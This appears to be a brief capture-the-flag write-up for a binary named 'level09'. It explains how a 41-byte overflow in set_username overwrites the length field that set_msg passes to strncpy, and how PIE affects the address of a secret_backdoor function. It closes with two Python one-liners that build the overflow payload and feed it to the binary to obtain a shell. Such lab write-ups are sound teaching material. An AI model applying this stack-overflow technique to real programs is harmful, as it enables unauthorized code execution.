after decompilation, we saw the program initializing a buffer of 140 bytes on the stack
then in the set_username, it take an input and copy 41 bytes to the previous buffer + 140
finally, the set_msg function use the value at buffer + 180 to know how much data will be copied
so we can control the length of how much bytes will be copied in strncpy because of the buffer overflow in set_username

PIE enabled makes the program's code section load at a random address each run, similar to ASLR
so the address of the secret_backdoor function change every execution, so we cannot predict it directly
instead, we have to find the relative offset the function compared to the base address of the executable

r < <(python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')

(python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ; cat) | ./level09
